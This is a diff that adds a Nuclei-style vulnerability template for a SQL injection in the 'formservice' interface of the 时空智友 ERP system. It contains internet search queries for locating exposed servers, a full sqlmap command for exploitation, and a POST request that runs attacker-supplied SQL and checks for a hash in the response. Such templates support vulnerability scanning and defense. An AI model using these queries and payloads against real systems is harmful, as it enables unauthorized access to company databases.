@@ -1,0 +1,34 @@
+id: skzy-erp-formservice-sqli
+
+info:
+  name: 时空智友企业流程化管控系统 ERP formservice - sqli
+  author: hufei,pphua
+  severity: high
+  description: 时空智友企业流程化管控系统 formservice接口处存在SQL注入漏洞。
+  reference:
+    - https://blog.csdn.net/xiaofengdada/article/details/132479402
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-1700598274"
+    hunter-query: web.icon=="2464cbce5dd2681dd4fb62d055520d78"
+    tips: '{"params": {"a": "11"}, "sql": "*"}'
+    sqlmap: sqlmap -r sqli.txt --level 5 --tamper=space2comment --risk 3 --batch --dbms=mssql
+  tags: skzy,2023,sqli,erp,oa
+
+http:
+    - method: POST
+      path: 
+        - "{{RootURL}}/formservice?service=workflow.sqlResult"
+      headers:
+        Content-Type: application/json
+      body: "{\"params\": {\"a\": \"11\"}, \"sql\": \"select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','qaxnb'))\"}"
+
+      matchers-condition: and
+      matchers:
+        - type: word
+          words:
+            - fd690c56512ce3624ed5cd4799e25d01
+        - type: status
+          status:
+            - 200
+
